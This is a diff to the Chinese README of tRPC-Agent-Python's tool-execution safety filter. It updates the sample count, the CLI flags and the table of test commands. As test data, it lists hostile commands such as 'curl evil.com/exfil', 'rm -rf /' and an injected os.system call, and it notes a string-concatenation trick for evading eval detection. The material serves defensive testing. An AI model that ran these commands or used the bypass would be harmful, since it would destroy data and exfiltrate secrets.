@@ -4,7 +4,7 @@ tRPC-Agent-Python 中用于工具/脚本执行的安全过滤器，在执行前�
 
 ## 快速开始
 
-运行 23 条安全扫描样例：
+运行 32 条安全扫描样例：
 
 ```bash
 cd trpc-agent-python
@@ -87,6 +87,7 @@ toolset = SafetyWrappedToolSet(inner=mcp_toolset, block_on_review=True)
 
 ```bash
 python scripts/tool_safety_check.py script.sh           # 退出码 0/1/2
+python scripts/tool_safety_check.py --block-on-review script.sh  # review 也按 blocked 退出 1
 python scripts/tool_safety_check.py --json script.py    # JSON 输出
 echo "rm -rf /" | python scripts/tool_safety_check.py --stdin
 ```
@@ -99,7 +100,7 @@ echo "rm -rf /" | python scripts/tool_safety_check.py --stdin
 - `denied_paths` — 触发 `DENY` 的文件系统路径
 - `network_allowlist` — 允许外连的域名
 - `max_timeout_seconds` / `max_output_bytes` / `max_file_write_bytes` — 资源限制
-- `secret_patterns` — 检测密钥的正则表达式
+- `secret_patterns` — 额外脱敏正则；硬编码的密钥、敏感路径和环境变量检测规则仍始终生效
 
 加载自定义策略：
 
@@ -110,10 +111,10 @@ policy = PolicyConfig.from_yaml("path/to/my_policy.yaml")
 
 ## 输出产物
 
-- `tool_safety_report.json` — 结构化扫描结果（23 条记录，每条对应一个样例）
+- `tool_safety_report.json` — 结构化扫描结果（32 条记录，每条对应一个样例）
 - `tool_safety_audit.jsonl` — JSONL 格式审计日志（每次扫描一行）
 
-## 23 条样例
+## 32 条样例
 
 | # | 样例 | 预期结果 |
 |---|---|---|
@@ -146,6 +147,9 @@ policy = PolicyConfig.from_yaml("path/to/my_policy.yaml")
 | 27 | `curl evil.com/exfil` | DENY |
 | 28 | `curl github.com` | ALLOW |
 | 29 | `rm --recursive --force /` | DENY |
+| 30 | `!; import os; os.system(...)` | DENY |
+| 31 | `curl -o x evil.com` | DENY |
+| 32 | `echo done # rm -rf / cleanup` | ALLOW |
 
 ## 与其他组件的关系
 
@@ -196,7 +200,7 @@ policy = PolicyConfig.from_yaml("path/to/my_policy.yaml")
 
 - **误报**：安全但不常见的模式（如测试夹具中的 `open` 调用、开发工具中合法的 `subprocess.run`）可能被标记。通过策略中的 `allowed_commands` 和 `network_allowlist` 调整。
 - **漏报**：混淆代码、动态构造的字符串和间接导入可能绕过静态规则。运行时根据用户输入构造 shell 命令的脚本不会被捕获。
-- **绕过风险**：字符串拼接规避（`getattr(__builtins__, 'ev' + 'al')`）可逃过静态检测；基于正则的 Bash 扫描无法捕获所有 shell 注入变体。简单的别名导入（`from os import system`）现已能检测。
+- **绕过风险**：基于正则的 Bash 扫描无法捕获所有 shell 注入变体。简单的别名导入（`from os import system`）现已能检测；Python 语法解析失败时会 fail-closed 并返回 `DENY`。
 - **动态 URL**：通过字符串格式化或用户输入构造的 URL 无法检查域名白名单，检测到时触发 `needs_human_review`。
 
 ## 扩展规则
